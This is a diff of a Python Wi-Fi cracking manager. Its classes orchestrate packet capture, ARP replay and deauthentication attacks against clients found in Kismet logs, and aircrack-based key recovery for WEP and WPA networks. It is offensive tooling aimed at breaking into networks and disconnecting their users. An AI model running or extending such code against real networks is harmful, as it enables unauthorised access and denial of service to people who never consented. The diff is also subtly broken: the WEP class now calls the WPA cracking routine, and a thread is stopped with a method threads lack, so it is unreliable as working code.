@@ -7,25 +7,44 @@ import xml.etree.ElementTree as ET
 import os
 import signal
 import time
+import logging
+
 
 class ListeningManager():
-    """docstring for ListeningManager"""
+    """
+    This class is the main operator.
+    """
     def __init__(self, maxListening = 1):
+        """
+        :param maxListening: Listening worker number limit
+
+        .. note:: It creates also 3 fields to handle the pids of processing threads
+        """
         self.maxListening = maxListening
         self.listeningList = []
         self.networkTable = []
 
     def updateNetworkTable(self, table):
+        """
+        This method sets the network table.
+
+        :param table: The updated network list
+        """
         self.networkTable = table
 
     def updateListening(self):
+        """
+        This method updates the listening list.
+        Called just after the :func:`updateNetworkTable`.
+        """
         tmpTable = self.networkTable[:self.maxListening]
         for network in tmpTable:
-            if tmp_network._Encryption.find('WEP') != -1 :
+            tmp_network = None
+            if network._Encryption.find('WEP') != -1 :
                 tmp_network = WEPListening(network)
-            elif tmp_network._Encryption.find('WPA') != -1 :
+            elif network._Encryption.find('WPA') != -1 :
                 tmp_network = WPAListening(network)
-            if tmp_network not in self.listeningList:
+            if tmp_network != None and tmp_network not in self.listeningList:
                 self.listeningList.append(tmp_network)
                 tmp_network.startListening()
 
@@ -39,62 +58,74 @@ class ListeningManager():
                 network.stopListening()
         """
 
-        print "Content of the ListeningList :"
-        for x in self.listeningList:
-            print x
-
-    def display(self):
-        print "Content of the ListeningManager :"
-        for x in self.networkTable:
-            print x
+        for qq in self.listeningList:
+            qq.update()
 
     def destroy(self):
+        """
+        Destroy all the listening threads (Safe exit)
+        """
         for listen in self.listeningList:
             listen.stopListening()
 
 
 class WEPListening():
-    """docstring for WEPListening"""
+    """
+    WEPListening is a specific class to handle the cracking of a Wifibox
+    which uses WEP security
+
+    .. todo: Create a SuperClass to merge WEPListening and WPAListening common behaviours
+    """
     def __init__(self, box):
+        """
+        :param box: The box to crack
+
+        .. note:: It creates also 3 fields to handle the pids of processing threads
+        """
         self.box = box
-        self.focus_listen_pid = -1
-        self.arp_pid = -1
+        self.focus_listen_pid = None
+        self.arp_pid = None
+        self.keep_alive_pid = None
+        self.aircrack_thread = None
 
     def startListening(self):
-        print "Starting... %s" % (self.box)
-        dir_name = "TestBox"
-        path = dir_name + "/" + box._ESSID
+        logging.info("Starting listening on %s", self.box._ESSID)
+        dir_path = "TestBox/" + self.box._ESSID
+        if not os.path.isdir(dir_path):
+            os.mkdir(dir_path)
         self.focus_listen_pid = network_listening(self.box)
-        keep_alive_packet(self.box)
+        self.keep_alive_pid = keep_alive_packet(self.box)
         self.arp_pid = arp_attack(self.box)
-        #<self.speed_up_process(self.box)
-        t_launch_aircrack = threading.Thread(target=result_aircrack_wep, args=(path,))
-        t_launch_aircrack.start()
+        self.aircrack_thread = threading.Thread(target=result_aircrack_wpa, args=(dir_path,))
+        self.aircrack_thread.start()
 
     """ forte probabilit� de necessite de debugger ce code
         process de deauthentification pour accelerer l'obtiention d'iv
     """
     def speed_up_process(self, box):
-        print "Starting deauthentification_attack ... %s" % (self.box)
         tab_client = []
         dir_name = "TestBox"
         nom_ecoute = "record"
         path = dir_name + "/" + box._ESSID
         nom_fichier_xml_ecoute_local = path + "/" + nom_ecoute + "-01.kismet.netxml"
-        sub_tree = ET.parse(nom_fichier_xml_ecoute_local)
-        sub_root = sub_tree.getroot()
-        for child in sub_root:
-            for c_tmp in child.findall('wireless-client'):
-                mac_client = c_tmp.find('client-mac').text
-                client = client_wifi(mac_client)
-                tab_client.append(client)
-        for i in xrange(10) :
+        try:
+            sub_tree = ET.parse(nom_fichier_xml_ecoute_local)
+            sub_root = sub_tree.getroot()
+            for child in sub_root:
+                for c_tmp in child.findall('wireless-client'):
+                    mac_client = c_tmp.find('client-mac').text
+                    client = client_wifi(mac_client)
+                    tab_client.append(client)
             for client in tab_client:
                 deauthentication_attack(self.box, client)
-                time.sleep(5)
+        except:
+            logging.critical("Cannot open or parse %s", nom_fichier_xml_ecoute_local)
+
+    def update(self):
+        self.speed_up_process(self.box)
 
     def stopListening(self):
-        print "Stoping... %s" % (self.box)
+        logging.info("Stopping listening on %s", self.box._ESSID)
         os.killpg(self.focus_listen_pid, signal.SIGTERM)
         os.killpg(self.arp_pid, signal.SIGTERM)
 
@@ -102,23 +133,38 @@ class WEPListening():
         return self.box == other.box
 
 class WPAListening():
-	def __init__(self,box):
-		self.box = box
-		self.focus_listen_pid = -1
-		self.aircrack_pid = -1
+    """
+    WPAListening is a specific class to handle the cracking of a Wifibox
+    which uses WPA security
 
-	def startListening(self):
-		print "Starting... %s" % (self.box)
-        dir_name = "TestBox"
-        path = dir_name + "/" + box._ESSID
-		self.focus_listen_pid = network_listening(self.box)
-        t_launch_aircrack = threading.Thread(target=result_aircrack_wpa, args=(path,))
-        t_launch_aircrack.start()
+    .. todo: Create a SuperClass to merge WEPListening and WPAListening common behaviours
+    """
+    def __init__(self,box):
+        """
+        :param box: The box to crack
 
-	def stopListening(self):
-		print "Stroping %s" % (self.box)
-		os.killpg(self.focus_listen_pid, signal.SIGTERM)
-		os.killpg(self.aircrack_pid, signal.SIGKILL)
+        .. note:: It creates also 2 fields to handle the pids of processing threads
+        """
+        self.box = box
+        self.focus_listen_pid = None
+        self.aircrack_thread = None
 
-	def __eq__(sefl, other):
-		return self.box == other.box
+    def startListening(self):
+        logging.info("Starting listening on %s", self.box._ESSID)
+        dir_path = "TestBox/" + self.box._ESSID
+        if not os.path.isdir(dir_path):
+            os.mkdir(dir_path)
+        self.focus_listen_pid = network_listening(self.box)
+        self.aircrack_thread = threading.Thread(target=result_aircrack_wpa, args=(dir_path,))
+        self.aircrack_thread.start()
+
+    def update(self):
+        pass
+
+    def stopListening(self):
+        logging.info("Stopping listening on %s", self.box._ESSID)
+        os.killpg(self.focus_listen_pid, signal.SIGTERM)
+        self.aircrack_thread.stop()
+
+    def __eq__(self, other):
+        return self.box == other.box
